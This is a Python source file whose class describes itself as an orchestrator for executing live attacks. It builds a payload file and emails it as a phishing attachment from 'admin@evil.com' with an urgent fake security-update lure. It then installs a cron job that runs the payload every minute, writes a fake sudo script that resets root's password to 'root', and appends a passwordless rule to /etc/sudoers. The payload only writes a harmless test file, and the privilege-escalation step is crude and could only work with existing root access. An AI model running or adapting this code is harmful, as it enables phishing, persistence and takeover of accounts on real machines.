"""
Real campaign orchestrator for executing live attacks.
"""

import os
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

class RealCampaignOrchestrator:
    """Orchestrates a real attack campaign."""

    def __init__(self, config):
        self.config = config

    def run_initial_access(self):
        """Executes the initial access phase of the attack."""

        # Create a simple payload
        payload = """
        import os
        os.system("echo 'Hello, from the payload!' > /tmp/payload.txt")
        """
        with open("payload.py", "w") as f:
            f.write(payload)

        # Create the email
        msg = MIMEMultipart()
        msg["From"] = "admin@evil.com"
        msg["To"] = self.config.target_email
        msg["Subject"] = "URGENT: Security Update"

        body = "Please apply this critical security update immediately."
        msg.attach(MIMEText(body, "plain"))

        # Attach the payload
        attachment = open("payload.py", "rb")
        part = MIMEBase("application", "octet-stream")
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        part.add_header("Content-Disposition", "attachment; filename=payload.py")
        msg.attach(part)

        # Send the email
        for i in range(5):
            try:
                server = smtplib.SMTP("localhost", self.config.smtp_port)
                server.sendmail(msg["From"], msg["To"], msg.as_string())
                server.quit()
                print("Initial access email sent successfully.")
                return
            except Exception as e:
                print(f"Failed to send initial access email: {e}")
                if i < 4:
                    print("Retrying in 5 seconds...")
                    time.sleep(5)
        print("Failed to send initial access email after multiple attempts.")

    def run_persistence(self):
        """Establishes persistence on the target machine."""

        # Create a cron job to execute the payload
        cron_job = f"* * * * * python3 {os.path.abspath('payload.py')}\n"
        try:
            with open("/tmp/apt_cron", "w") as f:
                f.write(cron_job)
            os.system("crontab /tmp/apt_cron")
            print("Persistence established successfully.")
        except Exception as e:
            print(f"Failed to establish persistence: {e}")
    def run_privilege_escalation(self):
        """Escalates privileges on the target machine."""

        # Create a fake sudo binary
        fake_sudo = """
        #!/bin/bash
        echo "root:root" | chpasswd
        /bin/bash
        """
        with open("/tmp/sudo", "w") as f:
            f.write(fake_sudo)
        os.chmod("/tmp/sudo", 0o755)

        # Exploit the sudo vulnerability
        try:
            os.system("echo 'ALL ALL=(ALL) NOPASSWD: /tmp/sudo' >> /etc/sudoers")
            os.system("sudo /tmp/sudo")
            print("Privilege escalation successful.")
        except Exception as e:
            print(f"Failed to escalate privileges: {e}")
